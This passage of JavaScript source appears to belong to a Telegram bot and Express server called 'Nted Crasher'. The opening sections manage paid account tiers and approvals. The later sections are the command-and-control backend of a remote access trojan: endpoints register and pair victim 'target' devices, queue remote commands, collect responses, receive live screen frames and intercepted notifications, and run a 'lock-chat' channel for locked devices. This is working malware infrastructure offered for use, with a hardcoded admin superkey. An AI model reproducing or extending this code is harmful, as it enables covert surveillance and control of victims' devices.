        [{ text: "💎 Member", callback_data: `cakun_${username}_member_${expiry}_${password}`, style: "success" }]
       ];
     } else if (hasAccess(userId, chatId)) {
        inlineKeyboard.inline_keyboard = [
        [{ text: "💎 Member", callback_data: `cakun_${username}_member_${expiry}_${password}`, style: "success" }]
       ];
     }
     
if (inlineKeyboard.inline_keyboard.length > 0) {
  return bot.sendMessage(chatId, `\`\`\`js
> Select the role according to your access

  Create for
🎎 Username: ${username}
🗞 Expired: ${expiryDays} Days
🔒 Password: The password will appear when the button is pressed. 
\`\`\``,
      { parse_mode: "Markdown", reply_markup: inlineKeyboard }
    );
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message?.chat?.id || query.from.id;
  const data = query.data;
  const userId = query.from.id;
  const userStatus = getUserStatus(userId);
  const username = query.from.username || `${query.from.first_name || ''} ${query.from.last_name || ''}`.trim();
  const messageId = query.message.message_id;
  
  if (data.startsWith("cakun_")) {
    const parts = data.replace("cakun_", "").split("_");
    if (parts.length < 4) return;

    const [username, role, expiry, password] = parts;

    if (role === 'staf' && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Akses owner hanya bisa di buat oleh Owner!" });
    }
    if (role === 'moderator' && !isVipStaf(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Kamu tidak punya akses untuk fitur ini!" });
    }
    if (role === 'owner' && !isVipStaf(userId) && !isModerator(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Akses owner hanya bisa di buat oleh Owner!" });
    }
    if (role === 'patner' && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Kamu tidak punya akses untuk fitur ini!" });
    }
    if (role === 'admin' && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId) && !isPatner(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Kamu tidak punya akses untuk fitur ini!" });
    }
    if (role === 'reseller' && !isVipStaf(userId) && !isModerator(userId) && !isOwner(userId) && !isAdmin(userId)) {
     return bot.answerCallbackQuery(query.id, { text: "Kamu tidak punya akses untuk fitur ini!" });
    }
    if (role === 'member' && !hasAccess(userId, chatId)) {
      return bot.answerCallbackQuery(query.id, { text: "Kamu tidak punya akses untuk fitur ini!" });
    }
    
    const users = loadDatabase();
    if (users.find(u => u.username === username)) {
      return bot.answerCallbackQuery(query.id, { text: "❌ Username already exists!" });
    }

    users.push({ username, password, role, expiredDate: null, status: "Pending", requesterId: userId });
    saveDatabase(users);

    bot.sendMessage(GBDB,
`<blockquote>🔮 NTED CRASHER DATABASE

🚨 Hello <b>STAFF/OWNER</b>, is there anyone who wants to request an account? Will it be accepted? Here is the data.

🔎  Requested account data
👤 Username: ${username}
🔐 Password: ***********
🧬 Role Acc: ${role}
📆 Expired: ${expiry} Hari

👤 User Yang Request: @${query.from.username || 'N/A'} (${userId})
</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "✅ Setujui", callback_data: `approve_${username}_${expiry}_${password}_${role}`, style: "success" }],
            [{ text: "❌ Tidak Setuju", callback_data: `reject_${username}`, style: "danger" }]
          ]}
      });
      
      await bot.deleteMessage(chatId, messageId);
      
    bot.answerCallbackQuery(query.id, { text: "⏳ Sedang menunggu persetujuan..." });
  }
  
  if (data.startsWith("approve_")) {
    const [ , username, expiry, password, role ] = data.split("_");
    const approverId = query.from.id;

    if (!isOwner(approverId)) {
      return bot.answerCallbackQuery(query.id, { text: "❌ Hanya Owner yang bisa approve!" });
    }

    const users = loadDatabase();
    const user = users.find(u => u.username === username);
    if (user && user.status === "Pending") {
      const expiryDate = new Date();
      expiryDate.setDate(expiryDate.getDate() + parseInt(expiry));
      user.expiredDate = expiryDate.toISOString().split("T")[0];
      user.status = "Active";
      saveDatabase(users);

   await bot.editMessageMedia({
     type: 'photo',
     media: 'https://files.catbox.moe/tcfhpc.jpg',
     caption: `
<blockquote>
Account with user: ${username} was successfully approved by @${query.from.username || 'N/A'} (${userId})
</blockquote>
`,
    parse_mode: "HTML"
    },{ chat_id: chatId, message_id: query.message.message_id,
     reply_markup: {
       inline_keyboard: [
         [{ text: "⌜ Owner ⌟", url: "https://t.me/NtedCrasherExec", style: "success" }],
         [
           { text: "⌜ Channel ⌟", url: "https://t.me/SenjuUpdateNew", style: "primary" },
           { text: "⌜ Group Chat ⌟", url: "https://t.me/NtedCrasherPublic", style: "primary" }
           ]
         ]
       }
     }
   );
   await bot.sendPhoto(user.requesterId, 'https://files.catbox.moe/m338bo.jpg', {
    caption: `
<blockquote>✅ Success, your account has been approved by the <b>owner/staff</b>, here is your account data:

📄 Your Account Data
👤 Username: ${username}
🔐 Password: <code>${password}</code>
🧬 Role Acc: ${role}
📆 Expired: ${expiryDate.toISOString().split('T')[0]}

⚡for security reasons:
It is forbidden to give accounts to people, and it is forbidden to share accounts for free.
</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
       inline_keyboard: [
         [ 
          { text: "⌜ Copy User ⌟", copy_text: { text: `${username}` }, style: "success" },
          { text: "⌜ Copy Key ⌟", copy_text: { text: `${password}` }, style: "success" }
         ],
         [
           { text: "⌜ Channel Info ⌟", url: "https://t.me/NtedCrasherPublic", style: "primary" }
           ]
         ]
       }
     }
   );
    bot.answerCallbackQuery(query.id, { text: `User ${username} created as ${role}!` });
    }
  }

  if (data.startsWith("reject_")) {
  const username = data.replace("reject_", "");
  const approverId = query.from.id;

  if (!isOwner(approverId)) {
    return bot.answerCallbackQuery(query.id, { text: "❌ Hanya Owner yang bisa reject!" });
  }

  const users = loadDatabase();
  const userToReject = users.find(u => u.username === username);
  if (!userToReject) {
    return bot.answerCallbackQuery(query.id, { text: "User not found!" });
  }

  const updatedUsers = users.filter(u => u.username !== username);

  bot.editMessageText(`❌ Akun ${username} ditolak dan tidak dibuat.`, {
    chat_id: query.message.chat.id,
    message_id: query.message.message_id
  });
  if (userToReject.requesterId) {
    bot.sendMessage(userToReject.requesterId, 
      `❌ Akun *${username}* ditolak oleh Owner, sehingga tidak dibuat.`, 
      { parse_mode: "Markdown" }
    );
  }

  bot.answerCallbackQuery(query.id, { text: `User ${username} rejected!` });
}

  if (data.startsWith("changerole_")) {
    const [ , username, newRole ] = data.split("_");
    const users = loadDatabase();
    const user = users.find(u => u.username === username);
    if (!user) return bot.answerCallbackQuery(query.id, { text: "User not found!" });

    user.role = newRole;
    saveDatabase(users);

    bot.editMessageText(`✅ Role user *${username}* berhasil diubah menjadi *${newRole}*`, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown"
    });

    bot.answerCallbackQuery(query.id, { text: `Role updated to ${newRole}` });
  }
  
  if (data.startsWith("view_")) {
    const username = data.replace("view_", "");
    const users = loadDatabase();
    const user = users.find(u => u.username === username);

    if (!user) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }

    const viewerRole = getUserStatus(userId);
    const targetRole = user.role;
    if (viewerRole === 'No Access') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    if (viewerRole === 'reseller' && targetRole !== 'member') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    if (viewerRole === 'admin' && targetRole === 'admin') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    if (viewerRole === 'owner' && targetRole === 'owner') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }

    const maskedPassword = "*".repeat(user.password.length);

    let buttons = [];
    const canDelete = checkDeletePermission(userId, user);
    if (canDelete) {
      buttons.push([{ text: "🗑 Delete User", callback_data: `delete_${user.username}`, style: "danger" }]);
    }

    buttons.push([{ text: "🔙 Back", callback_data: "back_list", style: "danger" }]);

    bot.editMessageText(
      `👤 *User Details*\n` +
      `• Username: *${user.username}*\n` +
      `• Password: \`${maskedPassword}\`\n` +
      `• Role: *${user.role}*\n` +
      `• Expired: *${user.expiredDate}*`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons }
      }
    );
  }

  if (data.startsWith("delete_")) {
    const username = data.replace("delete_", "");
    const userId = query.from.id;

    const users = loadDatabase();
    const userToDelete = users.find(u => u.username === username);

    if (!userToDelete) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    const canDelete = checkDeletePermission(userId, userToDelete);
    if (!canDelete) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to delete this user!" });
    }
    const updatedUsers = users.filter(u => u.username !== username);
    if (saveDatabase(updatedUsers)) {
      bot.answerCallbackQuery(query.id, { text: `User ${username} deleted!` });
    }

    const filteredUsers = updatedUsers.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;
      return true;
    });

    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}`, style: "primary" }
    ]);
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  if (data === "back_list") {
    const userId = query.from.id;
    const users = loadDatabase();
    const filteredUsers = users.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;
      return true;
    });
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}`, style: "success" }
    ]);
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  
  if (data === "acc_menu") {
    bot.editMessageCaption(
      `\`\`\`js
const InformasiBot = {
 name: "Nted Crasher",
 versi: "𝟏.𝟎",
 user: "@${username}",
 userid: "${userId}",
 status: "${userStatus}"
}

const MenuCreate = {
 cakun: "nted|30",
 freeacc: "Free account",
 accperma: "Perma Acc",
 cekakun: "username",
 setexpired: "nted|±7",
 setrole: "ubah role",
 listakun: "Daftar Akun",
 tutor: "tutor buat account"
}
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🍭 Next", callback_data: "other_ku", style: "success" }],
            [{ text: "⎙ Tutor Buat acc", callback_data: "tutor_bot", style: "success" }]
          ]
        }
      }
    );
  }
  
  if (data === "tutor_bot") {
    bot.editMessageCaption(
      `<blockquote>❗ Tutorial Buat Acc Vip

Use Bot: @XtrovieCBOT

1. Start bot
2. kembali ke group
3. pakai command di group
4. ketik /accperma nama|password
5. otomatis akun kekirim dari bot

Note: Password berupa text, bukan angka jika kamu menggunakan angka otomatis tidak bisa di gunakan, dan setiap user hanya memiliki akses 1x guna
</blockquote>`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "⎙ Free Account", callback_data: "free_bot", style: "success" }]
          ]
        }
      }
    );
  }
  
  if (data === "free_bot") {
    bot.editMessageCaption(
      `<blockquote>❗ Tutorial Buat Acc Free

Use Bot: @XtrovieCBOT

1. Start bot
2. gunakan command
3. command /freeacc nama|password
4. ikutin channel dan group nya 
5. otomatis akun kekirim dari bot

Note: Password berupa text, bukan angka jika kamu menggunakan angka otomatis tidak bisa di gunakan, dan setiap user hanya memiliki akses 1x guna
</blockquote>`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🍭 Next", callback_data: "other_ku", style: "success" }],
          ]
        }
      }
    );
  }

  if (data === "other_ku") {
    bot.editMessageCaption(
      `\`\`\`js
const InformasiBot = {
 name: "Nted Crasher",
 versi: "𝟏.𝟎",
 user: "@${username}",
 userid: "${userId}",
 status: "${userStatus}"
}

const MenuOwner = {
 addstaf: "Staf Vip",
 addmoderator: "Mods",
 addowner: "Access Own",
 addadmin: "Access Vip",
 addreseller: "Access Res",

 delstaf: "Staf Vip",
 delmoderator: "Mods",
 delowner: "Access Own",
 deladmin: "Access Vip",
 delreseller: "Access Res"
}
\`\`\``,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "🍬 Back", callback_data: "acc_menu", style: "success" }]
          ]
        }
      }
    );
  }
  
  if (data.startsWith('page_')) {
    const page = parseInt(data.split('_')[1]);
    
    bot.editMessageText(
      `📂 *User List:* (${userListCache[chatId].length} users)\n` +
      `📄 Page ${page + 1} of ${Math.ceil(userListCache[chatId].length / 5)}\n` +
      `👤 Showing ${page * 5 + 1}-${Math.min((page + 1) * 5, userListCache[chatId].length)}`,
      {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "Markdown"
      }
    );
    
    showUserPageKeyboard(chatId, messageId, page);
    
    bot.answerCallbackQuery(query.id);
  }
  
  if (data === 'page_info') {
    bot.answerCallbackQuery(query.id, {
      text: `📄 Page ${userListPageCache[chatId] + 1} of ${Math.ceil(userListCache[chatId].length / 5)}`,
      show_alert: true
    });
  }
});

let userListCache = {};
let userListPageCache = {};

bot.onText(/^\/listakun$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }

  const users = loadDatabase();
  const userStatus = getUserStatus(userId);

  let filteredUsers = users;
  
  if (userStatus === 'Reseller') {
    filteredUsers = users.filter(u => u.role === 'member');
  } else if (userStatus === 'Admin') {
    filteredUsers = users.filter(u => u.role === 'member' || u.role === 'reseller');
  }

  if (filteredUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 No users found.");
  }

  userListCache[chatId] = filteredUsers;
  userListPageCache[chatId] = 0;
  showUserPage(chatId, 0);
});

function showUserPage(chatId, page) {
  const users = userListCache[chatId];
  if (!users) {
    return bot.sendMessage(chatId, "❌ Data expired. Please use /listakun again.");
  }

  const totalUsers = users.length;
  const totalPages = Math.ceil(totalUsers / 5);
  
  if (page < 0) page = 0;
  if (page >= totalPages) page = totalPages - 1;
  userListPageCache[chatId] = page;
  const start = page * 5;
  const end = Math.min(start + 5, totalUsers);
  const pageUsers = users.slice(start, end);
  const userButtons = pageUsers.map(u => {
    return [{ 
      text: `${u.username || u.id} (${u.role || 'member'})`, style: "success",
      callback_data: `view_${u.username || u.id}`, style: "primary"
    }];
  });

  const navButtons = [];
  
  if (page > 0) {
    navButtons.push({ text: '⎙ Back', callback_data: `page_${page - 1}`, style: "danger" });
  }
  
  navButtons.push({ text: `${page + 1}/${totalPages}`, callback_data: 'page_info', style: "primary"});
  
  if (page < totalPages - 1) {
    navButtons.push({ text: 'Next ⎙', callback_data: `page_${page + 1}`, style: "success" });
  }

  const keyboard = [...userButtons];
  if (navButtons.length > 0) {
    keyboard.push(navButtons);
  }

  bot.sendMessage(chatId, 
    `📂 *User List:* (${totalUsers} users)\n` +
    `📄 Page ${page + 1} of ${totalPages}\n` +
    `👤 Showing ${start + 1}-${end}`,
    {
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    }
  );
}
function showUserPageKeyboard(chatId, messageId, page) {
  const users = userListCache[chatId];
  if (!users) return;
  
  const totalUsers = users.length;
  const totalPages = Math.ceil(totalUsers / 5);
  
  const start = page * 5;
  const end = Math.min(start + 5, totalUsers);
  const pageUsers = users.slice(start, end);

  const userButtons = pageUsers.map(u => {
    return [{ 
      text: `${u.username || u.id} (${u.role || 'member'})`, style: "success",
      callback_data: `view_${u.username || u.id}`, style: "primary"
    }];
  });

  const navButtons = [];
  
  if (page > 0) {
    navButtons.push({ text: '⎙ Previous', callback_data: `page_${page - 1}`, style: "danger" });
  }
  
  navButtons.push({ text: `${page + 1}/${totalPages}`, callback_data: 'page_info', style: "primary" });
  
  if (page < totalPages - 1) {
    navButtons.push({ text: 'Next ⎙', callback_data: `page_${page + 1}`, style: "success" });
  }

  const keyboard = [...userButtons];
  if (navButtons.length > 0) {
    keyboard.push(navButtons);
  }

  bot.editMessageReplyMarkup(
    { inline_keyboard: keyboard },
    { chat_id: chatId, message_id: messageId }
  );
}
bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = users.owners.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SessionPath)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'library' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SessionPath);

    for (const userFolder of userFolders) {
      const userPath = path.join(SessionPath, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = users.owners.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1004491209008"; 
    bot.sendMessage(targetChatId, `\`\`\`js
🔮 [ Server Info ]

Status Server = *ONLINE 🟢*
System Status = *RUNNING 🏃‍♂️*
Uptime = *Only accept start*

Everything is going well
\`\`\``, { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}

app.use(cors()); 
app.use(bodyParser.json({ limit: '500mb' })); 

app.get("/rat/pairid", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === keyInfo.username);
  if (idx === -1) return res.json({ valid: false, message: "User not found" });
  // Generate pairId kalau belum ada dan simpan
  if (!db[idx].pairId) {
    db[idx].pairId = genPairId();
    saveDatabase(db);
    console.log('[PAIRID] Generated for: ' + db[idx].username + ' → ' + db[idx].pairId);
  }
  console.log('[PAIRID] Serving pairId for: ' + db[idx].username + ' → ' + db[idx].pairId);
  res.json({ valid: true, pairId: db[idx].pairId, username: db[idx].username, role: db[idx].role });
});

app.post("/rat/grant-member", (req, res) => {
  const { ownerKey, memberUsername, deviceIds, allDevices } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner can grant" });
  const member = db.find(u => u.username === memberUsername);
  if (!member) return res.status(404).json({ valid: false, message: "Member not found" });
  if (!member.ratPerms) member.ratPerms = {};
  member.ratPerms[owner.username] = {
    approved: true,
    allDevices: allDevices === true,
    deviceIds: Array.isArray(deviceIds) ? deviceIds : [],
  };
  saveDatabase(db);
  console.log(`[GRANT] ${owner.username} → ${memberUsername} | allDevices:${allDevices} | ids:${deviceIds}`);
  res.json({ valid: true, message: `${memberUsername} berhasil diberi akses` });
});

app.post("/rat/revoke-member", (req, res) => {
  const { ownerKey, memberUsername } = req.body;
  const keyInfo = activeKeys[ownerKey];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid key" });
  const db = loadDatabase();
  const owner = db.find(u => u.username === keyInfo.username);
  if (!owner || owner.role !== "owner") return res.status(403).json({ valid: false, message: "Only owner" });
  const member = db.find(u => u.username === memberUsername);
  if (member && member.ratPerms) {
    delete member.ratPerms[owner.username];
    saveDatabase(db);
  }
  res.json({ valid: true, message: `Akses ${memberUsername} dicabut` });
});

app.get("/rat/my-devices", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false });
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(404).json({ valid: false });

  const targets = readRat(RAT_TARGETS);

  if (user.role === "moderator" || user.role === "staf") {
    const owned = targets.filter(t => t.owner === user.username);
    return res.json({ valid: true, pairId: user.pairId, role: user.role, devices: owned });
  }

  const perms = loadDevicePerms();
  const userPerm = perms[user.username.toLowerCase()];

  let allowedDevices = [];

  if (userPerm && userPerm.approved) {
    if (userPerm.allDevices) {
      allowedDevices = targets;
    } else if (Array.isArray(userPerm.devices) && userPerm.devices.length > 0) {
      allowedDevices = targets.filter(t => userPerm.devices.includes(t.id));
    }
  } else {
    for (const owner of db.filter(u => u.role === "moderator" || u.role === "staf")) {
      const perm = owner.ratPerms?.[user.username];
      if (!perm || !perm.approved) continue;
      const ownerDevices = targets.filter(t => t.owner === owner.username);
      if (perm.allDevices) {
        allowedDevices = allowedDevices.concat(ownerDevices);
      } else {
        allowedDevices = allowedDevices.concat(
          ownerDevices.filter(d => (perm.deviceIds || []).includes(d.id))
        );
      }
    }
  }

  res.json({ valid: true, pairId: null, role: user.role, devices: allowedDevices });
});

app.post('/api/heartbeat/:id', (req, res) => {
  const id = req.params.id;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === id);
  if (i !== -1) {
    t[i].lastSeen = new Date();
    t[i].status   = 'Online';
    if (req.body.battery) t[i].battery = req.body.battery;
    saveRat(RAT_TARGETS, t);
  }
  res.status(200).send('1');
});

app.post('/api/register-target', (req, res) => {
  const d = req.body;
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === d.id);
  if (i !== -1) t[i] = { ...t[i], ...d, lastSeen: new Date() };
  else          t.push({ ...d, lastSeen: new Date() });
  saveRat(RAT_TARGETS, t);
  res.json({ status: 'ok' });
});

app.post('/api/pair-target', (req, res) => {
  const { pairId, deviceId, model, battery } = req.body;
  if (!pairId || !deviceId) return res.status(400).json({ error: 'pairId dan deviceId wajib' });
  
  let db = loadDatabase();
  let dbChanged = false;
  for (let i = 0; i < db.length; i++) {
    if (!db[i].pairId) {
      db[i].pairId = genPairId();
      dbChanged = true;
      console.log('[AUTO-PAIR] Generated pairId for user: ' + db[i].username + ' → ' + db[i].pairId);
    }
  }
  if (dbChanged) saveDatabase(db);
  
  const ownerIdx = db.findIndex(u => 
    u.pairId && u.pairId.toUpperCase() === pairId.toUpperCase()
  );
  
  console.log('[PAIR-DEBUG] Looking for pairId: ' + pairId + ' | Found at index: ' + ownerIdx);
  if (ownerIdx >= 0) {
    console.log('[PAIR-DEBUG] Owner found: ' + db[ownerIdx].username + ' | Their pairId: ' + db[ownerIdx].pairId);
  } else {
    console.log('[PAIR-DEBUG] All pairIds in DB: ' + db.map(u => u.username + ':' + u.pairId).join(', '));
  }
  
  if (ownerIdx === -1) return res.status(404).json({ error: 'PairID tidak valid', hint: 'Cek pairId di Device Dashboard AX RRG' });
  const owner = db[ownerIdx];
  if (!owner.devices) owner.devices = [];
  if (!owner.devices.includes(deviceId)) {
    owner.devices.push(deviceId);
    db[ownerIdx] = owner;
    saveDatabase(db);
  }
  let t = readRat(RAT_TARGETS);
  const i = t.findIndex(x => x.id === deviceId);
  const dev = { id: deviceId, model: model || 'Unknown', battery: battery || '?', owner: owner.username, status: 'Online', lastSeen: new Date() };
  if (i !== -1) t[i] = { ...t[i], ...dev };
  else          t.push(dev);
  saveRat(RAT_TARGETS, t);
  console.log('[PAIR] ' + deviceId + ' → ' + owner.username);
  res.json({ status: 'paired', ownerUsername: owner.username });
});

app.get('/api/list-targets', (req, res) => {
  const { owner } = req.query;
  const t = readRat(RAT_TARGETS);
  res.json(owner ? t.filter(x => x.owner === owner) : t);
});

app.post('/api/send-command', (req, res) => {
  const { id, command, extra } = req.body;
  let cmds = readRat('./rat_commands.json');
  cmds = cmds.filter(c => c.targetId !== id);
  cmds.push({ targetId: id, command, extra: extra || '', timestamp: new Date() });
  saveRat('./rat_commands.json', cmds);
  console.log('[CMD] ' + id + ': ' + command);
  res.json({ status: 'queued' });
});

app.get('/api/get-command/:id', (req, res) => {
  const id = req.params.id;
  let cmds = readRat('./rat_commands.json');
  const i = cmds.findIndex(c => c.targetId === id);
  if (i !== -1) {
    const cmd = cmds[i];
    cmds.splice(i, 1);
    saveRat('./rat_commands.json', cmds);
    return res.json(cmd);
  }
  res.status(204).send();
});

app.post('/api/post-response/:id', (req, res) => {
  const id = req.params.id;
  const { cmd, data } = req.body;
  let resps = readRat('./rat_responses.json');
  const i = resps.findIndex(r => r.targetId === id);
  const nr = { targetId: id, cmd, data, timestamp: new Date() };
  if (i !== -1) resps[i] = nr; else resps.push(nr);
  saveRat('./rat_responses.json', resps);
  console.log('[RESP] ' + cmd + ' from ' + id);
  res.json({ status: 'ok' });
});

app.get('/api/get-response/:id', (req, res) => {
  const resps = readRat('./rat_responses.json');
  res.json(resps.find(r => r.targetId === req.params.id) || {});
});

app.post('/api/live-frame/:id', (req, res) => {
  const { frame, ts } = req.body;
  if (!frame) return res.status(400).json({ error: 'no frame' });
  RAT_LIVE[req.params.id] = { frame, ts: ts || Date.now() };
  res.json({ status: 'ok' });
});

app.get('/api/live-frame/:id', (req, res) => {
  const d = RAT_LIVE[req.params.id];
  if (!d) return res.status(404).json({ error: 'no frame yet' });
  res.json(d);
});

app.post('/api/post-notification/:id', (req, res) => {
  let n = readRat('./rat_notifs.json');
  n.unshift({ targetId: req.params.id, ...req.body, timestamp: new Date() });
  if (n.length > 1000) n = n.slice(0, 1000);
  saveRat('./rat_notifs.json', n);
  res.json({ status: 'saved' });
});

app.get('/api/get-notifications/:id', (req, res) => {
  const n = readRat('./rat_notifs.json');
  res.json(n.filter(x => x.targetId === req.params.id));
});

// Init RAT files
['rat_targets','rat_commands','rat_responses','rat_notifs'].forEach(f => {
  const p = './' + f + '.json';
  if (!fs.existsSync(p)) fs.writeFileSync(p, '[]');
});

app.get('/admin/listpairids', (req, res) => {
  const { superkey } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const list = db.map(u => ({ username: u.username, role: u.role, pairId: u.pairId || 'NONE' }));
  res.json(list);
});

app.get('/admin/genpairid', (req, res) => {
  const { superkey, username } = req.query;
  if (superkey !== 'CRPT-SUPER-2025') return res.status(403).json({ error: 'Forbidden' });
  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username);
  if (idx === -1) return res.json({ error: 'User not found' });
  db[idx].pairId = genPairId();
  saveDatabase(db);
  console.log(`[ADMIN] Force generated pairId for ${username}: ${db[idx].pairId}`);
  res.json({ username, pairId: db[idx].pairId });
});

app.post('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  const { text, from } = req.body;
  if (!text) return res.status(400).json({ error: 'text required' });
  if (!lockChats[id]) lockChats[id] = [];
  const msg = { from: from || 'moderator', text, time: new Date().toISOString().substring(11,16) };
  lockChats[id].push(msg);
  if (lockChats[id].length > 200) lockChats[id] = lockChats[id].slice(-200);
  console.log(`[CHAT] ${from||'owner'} → ${id}: ${text}`);
  res.json({ status: 'sent' });
});

app.get('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

app.get('/api/lock-chat-all/:id', (req, res) => {
  const { id } = req.params;
  res.json({ messages: lockChats[id] || [] });
});

// Clear chat saat unlock
app.delete('/api/lock-chat/:id', (req, res) => {
  const { id } = req.params;
  lockChats[id] = [];
  res.json({ status: 'cleared' });
});

app.get('/api/device/getPerms', (req, res) => { req.url = '/devicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.post('/api/device/setPerm', (req, res) => { req.url = '/setDevicePerm?' + (req.url.split('?')[1]||''); app.handle(req, res); });
app.get('/api/device/listPerms', (req, res) => { req.url = '/listDevicePerms?' + (req.url.split('?')[1]||''); app.handle(req, res); });

(function generateAllPairIds() {
  try {
    const db = loadDatabase();
